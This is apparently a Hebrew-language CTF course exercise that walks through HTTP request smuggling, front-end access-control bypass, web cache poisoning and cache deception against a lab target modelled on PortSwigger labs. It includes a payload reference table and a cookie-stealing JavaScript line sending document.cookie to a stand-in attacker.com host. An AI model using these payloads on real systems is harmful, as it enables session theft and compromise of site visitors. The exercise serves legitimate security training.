# אתגר CTF - תקיפות פרוטוקול HTTP

## הקדמה

אתגר זה משלב את כל הנושאים שנלמדו בפרק 5 - הברחת בקשות, תקיפות HTTP/2, poisoning cache, הטעיית cache וpoisoning תור תגובות. האתגר בנוי בארבעה שלבים, כל אחד דורש טכניקה שונה ומתבסס על הקודם.

---

## תיאור הסביבה

```
Target architecture:

[Client] --HTTPS/H2--> [CDN/Cache] --HTTP/1.1--> [Reverse Proxy] --HTTP/1.1--> [Application]

- The CDN receives HTTP/2 and performs a downgrade to HTTP/1.1
- The Reverse Proxy forwards requests to the Application with keep-alive
- The cache stores static resources by file extension
- The /admin management panel is blocked by the Reverse Proxy
- There is a login and session management system
```

---

## שלב 1 - זיהוי סוג הברחה

**מטרה:** גלו אם המערכת פגיעה להברחת בקשות, ומאיזה סוג.

### הנחיות

1. שלחו בקשות בדיקה לזיהוי CL.TE:

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1\r\n
Z\r\n
Q
```

2. שלחו בקשות בדיקה לזיהוי TE.CL:

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0\r\n
\r\n
X
```

3. אם שני הסוגים לא עבדו, נסו HTTP/2 downgrade:
   - שלחו בקשת HTTP/2 עם Content-Length לא תואם
   - בדקו injection CRLF בheaders HTTP/2
   - נסו Transfer-Encoding ב-HTTP/2

4. נסו ערפולי TE.TE:

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
```

**תוצאה מצופה:** זיהוי סוג ההברחה (CL.TE, TE.CL, H2.CL, H2.TE, או TE.TE) ואישור עם בקשה שגורמת לשגיאה בבקשה הבאה.

**מעבדות רלוונטיות:**
- PortSwigger: HTTP request smuggling, basic CL.TE vulnerability
- PortSwigger: HTTP request smuggling, basic TE.CL vulnerability
- PortSwigger: HTTP request smuggling, obfuscating the TE header
- PortSwigger: H2.CL request smuggling

---

## שלב 2 - bypass בקרות גישה

**מטרה:** השתמשו בהברחה שגיליתם כדי לגשת לפאנל הניהול.

### הנחיות

1. הבריחו בקשת GET ל-`/admin`:

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: <calculate>
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Content-Length: 10

x=1
```

2. אם `/admin` דורש header מיוחדת (כמו `X-Admin: true` או IP פנימי), גלו מה נדרש:
   - הבריחו בקשה שהתגובה שלה מוצגת לכם (למשל POST לתגובה/חיפוש)
   - לכדו את הheaders שהשרת החזיתי מוסיף
   - הוסיפו את הheaders הנדרשות לבקשה המוברחת

3. מצאו את פעולת מחיקת המשתמש בפאנל הניהול:

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: target.com
```

**תוצאה מצופה:** גישה לפאנל הניהול ומחיקת המשתמש `carlos`.

**מעבדות רלוונטיות:**
- PortSwigger: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE
- PortSwigger: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL
- PortSwigger: Exploiting HTTP request smuggling to reveal front-end request rewriting

---

## שלב 3 - poisoning cache

**מטרה:** הרעילו את הcache כך שכל מבקר באתר יטען JavaScript זדוני.

### הנחיות

1. מצאו קובץ JavaScript שנשמר בcache:

```http
GET /static/main.js HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
X-Cache: hit
Cache-Control: public, max-age=3600
```

2. השתמשו בהברחת בקשות כדי להרעיל את הcache:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: <calculate>
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: attacker.com
Content-Length: 10

x=1
```

3. ארחו JavaScript זדוני בשרת שלכם (exploit server):

```javascript
// https://attacker.com/static/main.js
document.location = 'https://attacker.com/steal?cookie=' + document.cookie;
```

4. שלחו את הבקשה המוברחת מספר פעמים עד שהcache ישמור את התגובה הזדונית

5. אשרו שהcache מורעל:

```http
GET /static/main.js HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
X-Cache: hit
(content from attacker.com)
```

**תוצאה מצופה:** כל מבקר באתר מטעין JavaScript מהשרת שלכם.

**אלטרנטיבה - poisoning ללא הברחה:**

אם יש headers שאינן במפתח הcache:

```http
GET /static/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

HTTP/1.1 200 OK
<script src="https://attacker.com/malicious.js"></script>
```

**מעבדות רלוונטיות:**
- PortSwigger: Exploiting HTTP request smuggling to perform web cache poisoning
- PortSwigger: Web cache poisoning with an unkeyed header
- PortSwigger: Web cache poisoning with multiple headers

---

## שלב 4 - גניבת session של אדמין

**מטרה:** השתמשו בהטעיית cache כדי לגנוב את ה-session של האדמין.

### הנחיות

1. מצאו דף עם מידע רגיש (כמו `/admin/settings` או `/admin/profile`)

2. בנו URL שגורם לcache לשמור את הדף הפרטי:

```
https://target.com/admin/settings/x.css
https://target.com/admin/settings;x.css
https://target.com/admin/settings%00.css
```

3. שלחו את ה-URL לאדמין (דרך XSS מהשלב הקודם, או דרך פונקציונליות קיימת):

```javascript
// In the malicious JavaScript from the previous step
fetch('https://target.com/admin/settings/x.css');
```

4. גשו ל-URL מגולמת (ללא Cookie) כדי לקרוא את תגובת האדמין:

```http
GET /admin/settings/x.css HTTP/1.1
Host: target.com
(without Cookie)

HTTP/1.1 200 OK
X-Cache: hit
(content of the admin's settings page, including an API key or session)
```

**אלטרנטיבה - poisoning תור תגובות:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: <calculate>
Transfer-Encoding: chunked

0

GET /login HTTP/1.1
Host: target.com

```

שלחו מיד אחרי בקשה רגילה ולכדו את ה-session של המשתמש הבא.

**תוצאה מצופה:** גניבת session או API key של האדמין.

**מעבדות רלוונטיות:**
- PortSwigger: Exploiting path mapping for web cache deception
- PortSwigger: Response queue poisoning via H2.TE request smuggling
- PortSwigger: Exploiting HTTP request smuggling to capture other users' requests

---

## אתגר נוסף - HackTheBox

### אתגרים רלוונטיים ב-HackTheBox

```
1. Neonify - CRLF injection in headers
2. Toxic - cache poisoning with PHP deserialization
3. Gunship - HTTP attack chain
4. Weather App - SSRF via request smuggling
5. Diogenes' Rage - race condition + HTTP
```

### משימה

בחרו אחד מהאתגרים הבאים ב-HackTheBox ופתרו אותו:

1. חפשו אתגרי Web עם תגיות "HTTP", "smuggling", "cache"
2. נסו לזהות את סוג החולשה לפני שאתם מתחילים לנצל
3. תעדו את כל שלבי הפתרון

---

## טבלת עזר - payloads

### הברחת CL.TE

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: <total_body_length>
Transfer-Encoding: chunked

0

<smuggled_request>
```

### הברחת TE.CL

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

<chunk_size_hex>
<smuggled_request_as_chunk_data>
0

```

### הברחת H2.CL

```
:method: POST
:path: /
:authority: target.com
content-type: application/x-www-form-urlencoded
content-length: 0

<smuggled_request>
```

### הברחת H2.TE (עם CRLF)

```
:method: POST
:path: /
:authority: target.com
foo: bar\r\nTransfer-Encoding: chunked

0

<smuggled_request>
```

---

## קריטריונים להצלחה

| שלב | קריטריון | ניקוד |
|-----|---------|-------|
| שלב 1 | זיהוי נכון של סוג ההברחה | 25% |
| שלב 2 | גישה לפאנל ניהול ומחיקת carlos | 25% |
| שלב 3 | הPoisoning cache שמשפיעה על כל המבקרים | 25% |
| שלב 4 | גניבת session/API key של אדמין | 25% |
| בונוס | פתרון אתגר HackTheBox | +10% |
| בונוס | כתיבת סקריפט אוטומציה | +10% |

---

## טיפים כלליים

1. **תמיד השתמשו ב-cache buster** כשאתם בודקים - הוסיפו פרמטר אקראי כדי לא להרעיל את הcache בטעות
2. **תעדו כל צעד** - רשמו את הבקשות והתגובות המדויקות
3. **חשבו Content-Length בקפידה** - בית אחד לא נכון יגרום לכישלון
4. **זכרו את ה-`\r\n`** - ב-Burp Suite, ודאו שאתם שולחים `\r\n` ולא `\n` בלבד
5. **עבדו בסביבה מבוקרת** - אל תנסו תקיפות אלו על מערכות ייצור ללא אישור
